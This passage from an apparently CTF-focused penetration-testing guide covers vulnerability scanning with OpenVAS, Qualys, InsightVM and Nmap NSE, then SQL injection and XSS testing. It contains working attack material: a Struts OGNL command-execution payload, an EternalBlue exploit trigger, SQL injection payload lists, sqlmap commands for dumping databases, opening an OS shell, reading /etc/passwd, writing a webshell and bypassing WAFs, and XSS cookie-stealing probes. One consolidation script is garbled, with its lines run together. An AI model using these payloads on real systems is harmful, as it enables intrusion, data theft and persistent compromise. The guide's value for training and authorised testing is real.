    --xml "<start_task task_id=\"$TASK_ID\"/>"
  
  echo "[*] Waiting for completion (this may take time)..."
  while true; do
    STATUS=$(gvm-cli --username admin --password password socket \
      --xml "<get_tasks task_id=\"$TASK_ID\"/>" | grep -oP 'status>\K[^<]+')
    echo "    Status: $STATUS"
    if [[ "$STATUS" == "Done" ]]; then
      break
    fi
    sleep 30
  done
  
  echo "[*] Exporting report for $target"
  gvm-cli --username admin --password password socket \
    --xml "<get_reports task_id=\"$TASK_ID\"/>" \
    > report_${target}.xml
done
```

**Context-specific applications:**

- **Open-source alternative:** No licensing costs; customizable for specialized checks
- **Integration with other tools:** XML output integrates with custom scripts, SIEM platforms
- **Detailed reporting:** Produces comprehensive vulnerability reports with remediation guidance
- **Compliance scanning:** Pre-built compliance check configurations

**Example CTF scenario:**

```bash
# Quick scan of single target
gvm-cli --username admin --password password socket \
  --xml '<create_target><name>CTF_System</name><hosts>192.168.1.100</hosts></create_target>'

# Execute with full and fast configuration
gvm-cli --username admin --password password socket \
  --xml '<create_task><name>CTF_Assessment</name><target id="TARGET_ID"></target><config id="FAST_CONFIG_ID"></config></create_task>'

gvm-cli --username admin --password password socket \
  --xml '<start_task task_id="TASK_ID"/>'

# Monitor and export
gvm-cli --username admin --password password socket \
  --xml '<get_tasks task_id="TASK_ID"/>'
```

---

### Qualys Integration

Qualys VMDR (Vulnerability Management, Detection, and Response) is enterprise-class cloud-based vulnerability scanner. Integration via REST API or web portal.

**API authentication:**

```bash
# Generate API token from Qualys portal
# Account Settings → Users → API Token → Generate Token

# Test API access
curl -u "username:password" \
  "https://qualysapi.qualys.com/api/2.0/fo/asset/host/vm/detection/?action=list&truncation_limit=1" \
  -H "X-Requested-With: curl"
```

**Initiate vulnerability scan:**

```bash
# List available scan templates
curl -u "username:password" \
  "https://qualysapi.qualys.com/api/2.0/fo/scan/?action=list" \
  -H "X-Requested-With: curl"

# Create scan
SCAN_REQUEST='<ServiceRequest>
  <data>
    <Scan>
      <name>CTF_Scan</name>
      <type>vulnerability</type>
      <ipAddress>192.168.1.100</ipAddress>
      <scannerAppliance>INTERNAL_SCANNER</scannerAppliance>
    </Scan>
  </data>
</ServiceRequest>'

curl -u "username:password" -X POST \
  "https://qualysapi.qualys.com/api/2.0/fo/scan/?action=launch" \
  -H "Content-Type: application/xml" \
  -d "$SCAN_REQUEST"
```

**Retrieve scan results:**

```bash
# List scans and their status
curl -u "username:password" \
  "https://qualysapi.qualys.com/api/2.0/fo/scan/?action=list" \
  -H "X-Requested-With: curl" > scans.xml

# Export scan findings
SCAN_ID="123456"
curl -u "username:password" \
  "https://qualysapi.qualys.com/api/2.0/fo/scan/$SCAN_ID/report/?action=launch&output_format=csv" \
  -H "X-Requested-With: curl" > vulnerabilities.csv
```

**Host-based vulnerability data:**

```bash
# Retrieve all detected vulnerabilities for hosts
curl -u "username:password" \
  "https://qualysapi.qualys.com/api/2.0/fo/asset/host/vm/detection/?action=list&host_id=192.168.1.100" \
  -H "X-Requested-With: curl"
```

**Filter by severity:**

```bash
# High and Critical severity findings
curl -u "username:password" \
  "https://qualysapi.qualys.com/api/2.0/fo/asset/host/vm/detection/?action=list&severity=4,5" \
  -H "X-Requested-With: curl"
```

Severity codes: 1=Informational, 2=Low, 3=Medium, 4=High, 5=Critical

**Batch host scanning:**

```bash
#!/bin/bash
TARGETS=("192.168.1.100" "192.168.1.101" "192.168.1.102")

for target in "${TARGETS[@]}"; do
  SCAN_REQUEST="<ServiceRequest>
    <data>
      <Scan>
        <name>Scan_$target</name>
        <type>vulnerability</type>
        <ipAddress>$target</ipAddress>
      </Scan>
    </data>
  </ServiceRequest>"
  
  curl -u "username:password" -X POST \
    "https://qualysapi.qualys.com/api/2.0/fo/scan/?action=launch" \
    -H "Content-Type: application/xml" \
    -d "$SCAN_REQUEST"
done
```

**Context-specific applications:**

- **Enterprise integration:** Centralized scanning across multiple locations
- **Compliance reporting:** Pre-built reports for audits and regulatory requirements
- **Continuous monitoring:** Scheduled scans with automated alerts on new vulnerabilities
- **Asset inventory:** Maintains comprehensive asset database with vulnerability correlations

**Example CTF scenario:**

```bash
# Quick scan and result retrieval
curl -u "username:password" -X POST \
  "https://qualysapi.qualys.com/api/2.0/fo/scan/?action=launch" \
  -H "Content-Type: application/xml" \
  -d '<ServiceRequest><data><Scan><name>CTF</name><type>vulnerability</type><ipAddress>192.168.1.100</ipAddress></Scan></data></ServiceRequest>'

# Wait and retrieve results
sleep 120
curl -u "username:password" \
  "https://qualysapi.qualys.com/api/2.0/fo/asset/host/vm/detection/?action=list&severity=4,5"
```

---

### Rapid7 InsightVM

Rapid7 InsightVM is enterprise vulnerability management platform with agentless scanning, real-time risk analytics, and integration with Metasploit.

**Installation (Rapid7 Scan Engine):**

```bash
# Download Rapid7 Scan Engine (requires account)
# InsightVM portal → Administration → Scan Engines → Download

# Install on designated scanning machine
sudo dpkg -i rapid7-scan-engine_VERSION.deb

# Start service
sudo systemctl start rapid7-scan-engine
```

**REST API scanning:**

```bash
# Authenticate to InsightVM API
TOKEN=$(curl -s -X POST \
  "https://INSIGHT_HOST:3780/api/3/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=password" \
  | jq -r '.token')

# List scan templates
curl -s -X GET \
  "https://INSIGHT_HOST:3780/api/3/scan_templates" \
  -H "X-API-Token: $TOKEN" | jq .

# Create scan
SCAN_PAYLOAD='{
  "name": "CTF_Scan",
  "template": "full-audit",
  "asset_filter": {
    "type": "all",
    "filters": [{
      "field": "ip-address",
      "operator": "in-range",
      "value": "192.168.1.100-192.168.1.110"
    }]
  }
}'

SCAN_ID=$(curl -s -X POST \
  "https://INSIGHT_HOST:3780/api/3/scans" \
  -H "X-API-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d "$SCAN_PAYLOAD" | jq -r '.id')

# Launch scan
curl -s -X POST \
  "https://INSIGHT_HOST:3780/api/3/scans/$SCAN_ID/action" \
  -H "X-API-Token: $TOKEN" \
  -d "action=resume"
```

**Retrieve scan results:**

```bash
# Get scan status
curl -s -X GET \
  "https://INSIGHT_HOST:3780/api/3/scans/$SCAN_ID" \
  -H "X-API-Token: $TOKEN" | jq '.status'

# List vulnerabilities from scan
curl -s -X GET \
  "https://INSIGHT_HOST:3780/api/3/scans/$SCAN_ID/vulnerabilities" \
  -H "X-API-Token: $TOKEN" | jq '.resources[] | {title: .title, cvss: .cvss, severity: .severity}'

# Export report
curl -s -X POST \
  "https://INSIGHT_HOST:3780/api/3/scans/$SCAN_ID/report" \
  -H "X-API-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"format":"pdf"}' > scan_report.pdf
```

**Vulnerability search:**

```bash
# Search for specific vulnerabilities (e.g., SQL injection)
curl -s -X GET \
  "https://INSIGHT_HOST:3780/api/3/vulnerabilities?q=sql%20injection" \
  -H "X-API-Token: $TOKEN" | jq '.resources[] | {id: .id, title: .title, cvss: .cvss}'

# Get detailed vulnerability information
curl -s -X GET \
  "https://INSIGHT_HOST:3780/api/3/vulnerabilities/VID" \
  -H "X-API-Token: $TOKEN" | jq '.references[] | {source: .source, url: .url}'
```

**Asset management:**

```bash
# Create asset group
curl -s -X POST \
  "https://INSIGHT_HOST:3780/api/3/asset_groups" \
  -H "X-API-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "CTF_Targets",
    "description": "CTF Challenge Targets",
    "filters": [{
      "field": "ip-address",
      "operator": "in-range",
      "value": "192.168.1.0-192.168.1.254"
    }]
  }'

# List asset details
curl -s -X GET \
  "https://INSIGHT_HOST:3780/api/3/assets" \
  -H "X-API-Token: $TOKEN" | jq '.resources[] | {id: .id, hostname: .hostname, ip: .ip}'
```

**Metasploit integration:**

InsightVM integrates with Metasploit for automated exploitation:

```bash
# Enable Metasploit integration (via GUI or API)
# Vulnerability → Action → Exploit with Metasploit

# API-based exploitation trigger
curl -s -X POST \
  "https://INSIGHT_HOST:3780/api/3/vulnerabilities/VULN_ID/exploit" \
  -H "X-API-Token: $TOKEN" \
  -d "metasploit_module=exploit/windows/smb/ms17_010_eternalblue"
```

**Context-specific applications:**

- **Risk scoring:** Contextual risk analysis based on asset criticality
- **Automated remediation:** Ticketing system integration for incident response
- **Metasploit integration:** Direct exploitation of discovered vulnerabilities
- **Real-time analytics:** Dynamic risk assessment as new vulnerabilities discovered

**Example CTF scenario:**

```bash
# Rapid reconnaissance and scanning
TOKEN=$(curl -s -X POST "https://localhost:3780/api/3/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin" | jq -r '.token')

# Create and launch scan
SCAN_ID=$(curl -s -X POST "https://localhost:3780/api/3/scans" \
  -H "X-API-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"CTF","template":"full-audit","asset_filter":{"type":"all"}}' \
  | jq -r '.id')

curl -s -X POST "https://localhost:3780/api/3/scans/$SCAN_ID/action" \
  -H "X-API-Token: $TOKEN" -d "action=resume"

# Monitor and retrieve results
sleep 120
curl -s -X GET "https://localhost:3780/api/3/scans/$SCAN_ID/vulnerabilities?severity=critical,severe" \
  -H "X-API-Token: $TOKEN" | jq '.resources[] | {title, cvss, severity}'
```

---

### Custom Nmap NSE Scripts for CVEs

Nmap Scripting Engine (NSE) allows custom vulnerability detection using Lua-based scripts. NSE scripts combine service enumeration with CVE checking.

**NSE script location:**

```bash
# Default script directories
/usr/share/nmap/scripts/
/usr/share/nmap/scripts/lib/

# List available scripts
nmap --script-help | head -50
```

**Basic NSE scanning syntax:**

```bash
# Run default scripts (version detection + NSE defaults)
nmap -sV --script default 192.168.1.100

# Run specific script
nmap --script smb-vuln-ms17-010 192.168.1.100

# Run script category (all, auth, broadcast, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, vuln)
nmap --script vuln 192.168.1.100
```

**Vulnerability scanning script categories:**

```bash
# All vulnerability detection scripts
nmap --script vuln 192.168.1.100

# Specific CVE targeting
nmap --script smb-vuln-cve-2017-7494 192.168.1.100      # Samba remote execution
nmap --script mysql-vuln-cve2012-2122 192.168.1.100     # MySQL authentication bypass
nmap --script http-vuln-cve2017-5638 192.168.1.100      # Apache Struts vulnerability
nmap --script ssl-ccs-injection 192.168.1.100           # OpenSSL CCS injection
```

**Custom NSE script creation for CVE detection:**

Simple NSE script detecting Apache Struts vulnerability (CVE-2017-5638):

```lua
-- http-vuln-cve2017-5638.nse
local http = require "http"
local shortport = require "shortport"

description = [[
Detects Apache Struts vulnerability (CVE-2017-5638)
OGNL expression injection in Content-Type header
]]

author = "Security Team"
license = "Same as Nmap--See the file LICENSE"
categories = {"vuln", "exploit"}

portrule = shortport.http

action = function(host, port)
  local payload = "Content-Type: %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('id'))}"
  
  local options = {
    header = {
      ["Content-Type"] = payload
    }
  }
  
  local response = http.post(host, port, "/", options)
  
  if response and response.status == 200 then
    return "VULNERABLE - Apache Struts CVE-2017-5638 detected"
  else
    return "Not vulnerable or service not responding"
  end
end
```

**Script argument passing:**

```bash
# Pass script arguments for customization
nmap --script http-vuln-cve2017-5638 \
  --script-args http-vuln-cve2017-5638.method=POST \
  192.168.1.100
```

**Running multiple CVE scripts:**

```bash
# Comma-separated script list
nmap --script smb-vuln-ms17-010,smb-vuln-ms10-054,smb-vuln-ms09-050 \
  -p 445 192.168.1.100

# Wildcard pattern matching
nmap --script "smb-vuln-*" -p 445 192.168.1.100
nmap --script "ssl-*" -p 443 192.168.1.100
```

**Output filtering and analysis:**

```bash
# Save script output to file
nmap --script vuln 192.168.1.100 -oN vuln_scan.txt

# Parse vulnerabilities from output
grep -i "vulnerable\|exploit\|critical" vuln_scan.txt

# XML output for automated processing
nmap --script vuln 192.168.1.100 -oX vuln_scan.xml
```

**Common NSE vulnerability scripts:**

```bash
# SMB/Windows vulnerabilities
nmap --script smb-vuln-ms17-010 -p 445              # EternalBlue
nmap --script smb-vuln-ms08-067 -p 445              # Conficker
nmap --script smb-vuln-ms10-054 -p 445              # SMB v2 Denial of Service

# HTTP/Web vulnerabilities
nmap --script http-vuln-cve2017-5645 -p 80          # Struts2
nmap --script http-vuln-cve2014-3704 -p 80          # Drupal SQL injection
nmap --script http-vuln-cve2016-3714 -p 80          # ImageMagick

# Database vulnerabilities
nmap --script mysql-vuln-cve2012-2122 -p 3306       # MySQL auth bypass
nmap --script mongodb-brute -p 27017                # MongoDB credential brute-force
nmap --script postgresql-brute -p 5432              # PostgreSQL credential brute-force

# SSL/TLS vulnerabilities
nmap --script ssl-ccs-injection -p 443              # CCS Injection
nmap --script ssl-drown -p 443                      # DROWN attack
nmap --script sslv2 -p 443                          # SSLv2 detection
```

**Service-specific vulnerability scanning:**

```bash
# Aggressive web application scanning
nmap -sV --script http-* -p 80,443 192.168.1.100

# Aggressive SMB scanning
nmap -sV --script smb-* -p 139,445 192.168.1.100

# Aggressive database scanning
nmap -sV --script "*-brute" -p 3306,5432,27017,6379 192.168.1.100
```

**Scripting with version detection:**

```bash
# Combine service version detection with targeted CVE scripts
nmap -sV -p 445 192.168.1.100 --script smb-vuln-\*

# Version detection triggers appropriate vulnerability scripts
# OpenSSH 7.4 → SSH version enumeration + specific OpenSSH CVE scripts
nmap -sV -p 22 192.168.1.100 --script ssh-\*
```

**[Unverified]** NSE script reliability depends on:

- Accurate service version detection
- Correct CVE signature implementation
- Target system response patterns matching expected behavior
- Network conditions allowing complete script execution

**Performance optimization for multiple scripts:**

```bash
# Scan entire network with vulnerability scripts
nmap --script vuln -T4 --min-rate 1000 192.168.1.0/24 -oN network_vulns.txt

# Parallel scanning of multiple targets
nmap --script "cve-*" -p 445 $(seq 192.168.1.1 192.168.1.254) &
```

**Context-specific applications:**

- **Targeted exploitation:** Focus on specific known CVEs relevant to discovered services
- **Rapid assessment:** NSE scripts provide faster results than manual testing
- **Compliance scanning:** Automated check for known vulnerable configurations
- **CTF optimization:** Quick identification of exploitable vulnerabilities without full vulnerability scan overhead

**Example CTF scenario:**

```bash
# Rapid NSE-based reconnaissance
# Phase 1: Service detection
nmap -sV 192.168.1.0/24 -oN services.txt

# Phase 2: Version-specific vulnerability scanning
nmap -sV --script vuln -p 22,80,139,445,3306,5432 192.168.1.100 -oN vuln_assessment.txt

# Phase 3: Extract and prioritize vulnerabilities
grep -i "vulnerable\|critical" vuln_assessment.txt | cut -d: -f1-2 | sort -u

# Phase 4: Targeted exploitation
# (Use identified vulnerabilities to guide Metasploit or manual exploitation)
```

---

### Integrated Active Vulnerability Scanning Workflow

**Comprehensive multi-tool vulnerability assessment combining all techniques:**

```bash
#!/bin/bash
TARGET_RANGE="192.168.1.0/24"
OUTPUT_DIR="vuln_scan_results"
mkdir -p $OUTPUT_DIR

echo "[*] Starting comprehensive vulnerability scanning"
echo "[*] Target range: $TARGET_RANGE"
echo "[*] Output directory: $OUTPUT_DIR"
echo ""

# Phase 1: Quick NSE vulnerability scan (fast baseline)
echo "[+] Phase 1: NSE vulnerability baseline"
nmap --script vuln -T4 --min-rate 2000 $TARGET_RANGE \
  -oN $OUTPUT_DIR/nmap_vuln_baseline.txt \
  -oX $OUTPUT_DIR/nmap_vuln_baseline.xml &
NSE_PID=$!

# Phase 2: OpenVAS comprehensive scan (parallel)
echo "[+] Phase 2: OpenVAS comprehensive assessment"
# (Requires OpenVAS installation and target creation via web UI or API)
# gvm-cli commands here

# Phase 3: Nessus quick scan (if available)
echo "[+] Phase 3: Nessus vulnerability assessment"
# nessuscli commands here

# Wait for NSE scan completion
wait $NSE_PID

# Phase 4: Parse and consolidate results
echo "[+] Phase 4: Consolidating results"

# Extract high/critical vulnerabilities
echo "=== HIGH/CRITICAL VULNERABILITIES ===" > $OUTPUT_DIR/critical_vulns.txt
grep -i "vulnerable\|critical\|exploit" $OUTPUT_DIR/nmap_vuln_baseline.txt >> $OUTPUT_DIR/critical_vulns.txt

# Extract affected hosts

echo "=== AFFECTED HOSTS ===" > $OUTPUT_DIR/affected_hosts.txt grep -oP '^\d+.\d+.\d+.\d+' $OUTPUT_DIR/nmap_vuln_baseline.txt | sort -u >> $OUTPUT_DIR/affected_hosts.txt

# Parse CVE information

echo "=== IDENTIFIED CVEs ===" > $OUTPUT_DIR/cves.txt grep -oP 'CVE-\d{4}-\d+' $OUTPUT_DIR/nmap_vuln_baseline.txt | sort -u >> $OUTPUT_DIR/cves.txt

# Phase 5: Risk prioritization

echo "[+] Phase 5: Risk prioritization"

# Generate prioritized exploit list

cat > $OUTPUT_DIR/exploitation_priority.txt << 'EOF' === EXPLOITATION PRIORITY (by impact & exploitability) ===

CRITICAL - Immediate exploitation: EOF

# Extract SMB vulnerabilities (often critical)

if grep -q "smb-vuln" $OUTPUT_DIR/nmap_vuln_baseline.txt; then echo "[!] SMB vulnerabilities detected - potential RCE" >> $OUTPUT_DIR/exploitation_priority.txt grep "smb-vuln" $OUTPUT_DIR/nmap_vuln_baseline.txt >> $OUTPUT_DIR/exploitation_priority.txt fi

# Extract web vulnerabilities

if grep -q "http-vuln" $OUTPUT_DIR/nmap_vuln_baseline.txt; then echo "[!] Web application vulnerabilities detected" >> $OUTPUT_DIR/exploitation_priority.txt grep "http-vuln" $OUTPUT_DIR/nmap_vuln_baseline.txt >> $OUTPUT_DIR/exploitation_priority.txt fi

# Extract database vulnerabilities

if grep -q "mysql-vuln|postgresql-vuln" $OUTPUT_DIR/nmap_vuln_baseline.txt; then echo "[!] Database vulnerabilities detected - potential credential access" >> $OUTPUT_DIR/exploitation_priority.txt grep -E "mysql-vuln|postgresql-vuln" $OUTPUT_DIR/nmap_vuln_baseline.txt >> $OUTPUT_DIR/exploitation_priority.txt fi

# Phase 6: Generate summary report

echo "[+] Phase 6: Generating summary report"

# cat > $OUTPUT_DIR/SCAN_SUMMARY.txt << EOF

# VULNERABILITY SCAN SUMMARY

Scan Date: $(date) Target Range: $TARGET_RANGE Tools Used: Nmap NSE, OpenVAS, Nessus

# FINDINGS OVERVIEW

Total Affected Hosts: $(wc -l < $OUTPUT_DIR/affected_hosts.txt) Unique CVEs Identified: $(wc -l < $OUTPUT_DIR/cves.txt) Critical Vulnerabilities: $(grep -c "CRITICAL" $OUTPUT_DIR/nmap_vuln_baseline.txt || echo "0")

# OUTPUT FILES

- nmap_vuln_baseline.txt: Full NSE vulnerability scan results
- nmap_vuln_baseline.xml: XML format for automated processing
- affected_hosts.txt: List of hosts with vulnerabilities
- cves.txt: All identified CVEs
- critical_vulns.txt: Filtered high/critical findings
- exploitation_priority.txt: Prioritized exploitation targets
- This summary

# RECOMMENDED NEXT STEPS

1. Review critical_vulns.txt for immediate exploitation candidates
2. Check exploitation_priority.txt for risk-prioritized targets
3. Cross-reference CVEs against Metasploit modules
4. Conduct credentialed scans for deeper assessment
5. Plan exploitation sequence based on service dependencies

================================================================================ EOF

echo "" echo "[+] Scanning complete!" echo "[+] Results saved to: $OUTPUT_DIR/" echo "[+] Summary: $OUTPUT_DIR/SCAN_SUMMARY.txt" echo "" cat $OUTPUT_DIR/SCAN_SUMMARY.txt

````

**Advanced multi-tool correlation:**

```bash
#!/bin/bash
# Correlate findings across multiple scanning tools

NMAP_XML="nmap_vuln_baseline.xml"
NESSUS_OUTPUT="scan_results.nessus"
OPENVAS_OUTPUT="openvas_report.xml"

echo "[*] Correlating vulnerability findings across tools"

# Extract CVEs from Nmap
echo "[+] Parsing Nmap NSE results..."
grep -oP 'CVE-\d{4}-\d+' nmap_vuln_baseline.txt | sort -u > cves_nmap.txt

# Extract CVEs from Nessus (if available)
if [ -f "$NESSUS_OUTPUT" ]; then
  echo "[+] Parsing Nessus results..."
  grep -oP 'CVE-\d{4}-\d+' $NESSUS_OUTPUT | sort -u > cves_nessus.txt
fi

# Extract CVEs from OpenVAS (if available)
if [ -f "$OPENVAS_OUTPUT" ]; then
  echo "[+] Parsing OpenVAS results..."
  grep -oP 'CVE-\d{4}-\d+' $OPENVAS_OUTPUT | sort -u > cves_openvas.txt
fi

# Find CVEs confirmed by multiple tools (higher confidence)
echo "[+] Cross-tool correlation..."
cat cves_*.txt | sort | uniq -c | sort -rn | awk '$1 > 1 {print $2, "("$1" tools)"}' > confirmed_cves.txt

echo "[+] Results:"
cat confirmed_cves.txt
````

**Metasploit integration for validation:**

```bash
#!/bin/bash
# Validate vulnerabilities against available Metasploit exploits

CVE_LIST="cves.txt"

echo "[*] Checking Metasploit exploit availability"

# Start msfconsole in headless mode
msfconsole -q -x "search type:exploit" > /tmp/exploits.txt &
MSF_PID=$!

sleep 5

# For each identified CVE, search Metasploit
while read cve; do
  if grep -q "$cve" /tmp/exploits.txt; then
    echo "[+] Exploit available for $cve"
    grep "$cve" /tmp/exploits.txt | awk '{print "    " $0}'
  fi
done < $CVE_LIST

kill $MSF_PID 2>/dev/null
```

**Context-specific applications:**

- **Layered validation:** Multiple tools confirm vulnerabilities, reducing false positives
- **Tool specialization:** Each scanner (NSE, OpenVAS, Nessus) has different plugin coverage
- **Comprehensive reporting:** Consolidated results provide complete vulnerability picture
- **Exploitation planning:** Prioritized list guides systematic compromise of target environment

**Example CTF execution (end-to-end):**

```bash
# Complete vulnerability scanning and prioritization workflow

TARGET="192.168.1.100"
OUTPUT="ctf_vuln_assessment"
mkdir -p $OUTPUT

# 1. Fast NSE scan for quick baseline
echo "[*] NSE quick scan..."
nmap --script vuln -T4 $TARGET -oN $OUTPUT/nse_results.txt

# 2. Service-specific vulnerability checks
echo "[*] Service-specific checks..."
nmap -sV -p 22,80,139,445,3306,5432 --script vuln $TARGET -oN $OUTPUT/service_vulns.txt

# 3. Extract and prioritize
echo "[*] Generating exploitation roadmap..."
grep -i "vulnerable" $OUTPUT/*.txt | \
  sed 's/:.*//' | cut -d'(' -f2 | cut -d')' -f1 | sort | uniq -c | sort -rn \
  > $OUTPUT/vulnerability_frequency.txt

# 4. Map to Metasploit modules
echo "[*] Identifying applicable exploits..."
grep -oP 'CVE-\d{4}-\d+' $OUTPUT/*.txt | cut -d: -f2 | sort -u > $OUTPUT/cves_found.txt

echo "[+] Assessment complete!"
echo ""
echo "=== TOP VULNERABILITIES ==="
head -n 5 $OUTPUT/vulnerability_frequency.txt
```

This integrated approach leverages multiple scanning tools for comprehensive, validated vulnerability identification within CTF environments.

---

## Web Vulnerability Assessment

### SQL Injection Detection

SQL Injection (SQLi) occurs when user input is improperly sanitized before being included in SQL queries, allowing attackers to manipulate database operations.

**Manual SQL Injection Detection - Basic Tests:**

```bash
# Single quote test (most basic indicator)
'
''
`
``
,
"
""
/
//
\
\\

# Comment sequences
-- 
--+
#
/*
*/
;%00

# Boolean-based payloads
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1
') OR ('1'='1

# Example URL tests
http://target.com/page.php?id=1'
http://target.com/page.php?id=1' OR '1'='1
http://target.com/page.php?id=1' AND '1'='2
http://target.com/page.php?id=1 AND 1=1
http://target.com/page.php?id=1 AND 1=2
```

**Manual Detection - Error-Based:**

```bash
# Trigger database errors to identify injection points
'
"
`
')
")
`)
'))
"))
`))

# MySQL error triggers
' AND 1=CONVERT(int, (SELECT @@version))--
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--

# PostgreSQL error triggers
' AND 1=CAST('a' AS INTEGER)--
' AND 1::int=1--

# MSSQL error triggers
' AND 1=CONVERT(int, @@version)--
' HAVING 1=1--

# Oracle error triggers
' AND 1=UTL_INADDR.GET_HOST_ADDRESS('a')--
' AND ROWNUM=1--
```

**Manual Detection - Time-Based Blind:**

```bash
# MySQL time delays
' AND SLEEP(5)--
' OR SLEEP(5)--
1' AND SLEEP(5)#
'; WAITFOR DELAY '0:0:5'--

# PostgreSQL time delays
' AND pg_sleep(5)--
'; SELECT pg_sleep(5)--

# MSSQL time delays
'; WAITFOR DELAY '0:0:5'--
' WAITFOR DELAY '0:0:5'--

# Oracle time delays
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--

# Example testing workflow
# Send request, measure response time
curl -w "@curl-format.txt" "http://target.com/page.php?id=1' AND SLEEP(5)--"

# curl-format.txt contents:
# time_total: %{time_total}\n
```

**Manual Detection - UNION-Based:**

```bash
# Determine number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
# Continue until error occurs

# Alternative column enumeration
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
# Continue until no error

# Find string-compatible columns
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

# Extract database information
' UNION SELECT version(),NULL,NULL--
' UNION SELECT database(),user(),NULL--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
```

**Manual Detection - Different Contexts:**

```bash
# Numeric context (no quotes needed)
1 OR 1=1
1 AND 1=2
1 UNION SELECT NULL,NULL

# String context (requires quote escape)
admin' OR '1'='1
admin') OR ('1'='1

# Search context
%' OR 1=1--
test%' OR '1'='1

# JSON context
{"user":"admin\" OR \"1\"=\"1"}

# XML context
<user>admin' OR '1'='1</user>

# HTTP headers
X-Forwarded-For: 1' OR '1'='1
User-Agent: ' OR 1=1--
Cookie: id=1' OR '1'='1
```

**sqlmap - Automated SQL Injection Tool:**

```bash
# Basic sqlmap usage
sqlmap -u "http://target.com/page.php?id=1"

# POST request testing
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Test specific parameter
sqlmap -u "http://target.com/page.php?id=1&name=test" -p id

# Cookie-based injection
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abc123;id=1" -p id

# Header injection
sqlmap -u "http://target.com/page.php" --headers="X-Forwarded-For: 1*"

# HTTP request from file
sqlmap -r request.txt

# Example request.txt:
# GET /page.php?id=1 HTTP/1.1
# Host: target.com
# User-Agent: Mozilla/5.0
# Cookie: session=abc123
```

**sqlmap Advanced Options:**

```bash
# Specify DBMS (faster if known)
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql
sqlmap -u "http://target.com/page.php?id=1" --dbms=postgresql
sqlmap -u "http://target.com/page.php?id=1" --dbms=mssql

# Risk and level (higher = more payloads, more intrusive)
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
# Level: 1-5 (default 1) - tests more parameters
# Risk: 1-3 (default 1) - uses more dangerous payloads

# Force technique
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
# B: Boolean-based blind
# E: Error-based
# U: UNION query-based
# S: Stacked queries
# T: Time-based blind
# Q: Inline queries

# Specify injection technique
sqlmap -u "http://target.com/page.php?id=1" --technique=U
sqlmap -u "http://target.com/page.php?id=1" --technique=T --time-sec=10

# Thread optimization
sqlmap -u "http://target.com/page.php?id=1" --threads=10

# Tamper scripts for WAF bypass
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page.php?id=1" --tamper=between,randomcase

# Common tamper scripts:
# space2comment: Replace space with comment
# randomcase: Random case for keywords
# between: Replace > with BETWEEN
# charencode: URL encode characters
```

**sqlmap Database Enumeration:**

```bash
# List databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Current database
sqlmap -u "http://target.com/page.php?id=1" --current-db

# List tables in database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# List columns in table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Dump table data
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump

# Dump specific columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump

# Dump all databases
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Search for specific data
sqlmap -u "http://target.com/page.php?id=1" --search -C password
sqlmap -u "http://target.com/page.php?id=1" --search -T users
```

**sqlmap Authentication and Session Handling:**

```bash
# Basic authentication
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="user:pass"

# Form-based authentication
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="user:pass" --auth-file=/path/to/login.txt

# Session handling
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Keep-alive
sqlmap -u "http://target.com/page.php?id=1" --keep-alive

# Follow redirects
sqlmap -u "http://target.com/page.php?id=1" --follow-redirects

# Proxy usage
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

**sqlmap OS Interaction (if privileges allow):**

```bash
# OS shell access
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# Command execution
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# File read
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# File write
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

**sqlmap WAF Detection and Bypass:**

```bash
# Identify WAF
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# Random User-Agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Custom User-Agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0"

# Delay between requests
sqlmap -u "http://target.com/page.php?id=1" --delay=2

# Randomize delay
sqlmap -u "http://target.com/page.php?id=1" --delay=2 --randomize

# Multiple tamper scripts
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,between,randomcase
```

### XSS Detection

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users.

**Manual XSS Detection - Basic Payloads:**

```bash
# Simple alert payloads
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

# Image tag XSS
<img src=x onerror=alert(1)>
